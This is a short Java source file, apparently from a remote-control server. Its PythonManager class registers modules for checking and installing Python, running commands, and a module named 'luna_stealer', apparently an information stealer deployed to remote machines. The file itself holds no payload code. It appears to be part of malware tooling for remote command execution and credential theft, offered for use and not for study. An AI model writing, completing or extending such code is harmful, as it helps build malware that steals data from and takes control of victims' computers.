package me.kutuzov.server.python.manager;

import me.kutuzov.server.python.pmodule.PythonModule;
import me.kutuzov.server.python.pmodule.modules.PyModCheckInstalled;
import me.kutuzov.server.python.pmodule.modules.PyModCommand;
import me.kutuzov.server.python.pmodule.modules.PyModInstall;
import me.kutuzov.server.python.pmodule.modules.installable.PyModILuna;

import java.util.HashMap;

public class PythonManager {
    public HashMap<String, PythonModule<?>> modules = new HashMap<>();
    public PythonManager() {
        modules.put("isInstalled", new PyModCheckInstalled());
        modules.put("install", new PyModInstall());
        modules.put("command", new PyModCommand());

        modules.put("luna_stealer", new PyModILuna());
    }

    public PythonModule<?> getModule(String name) {
        return modules.get(name);
    }
}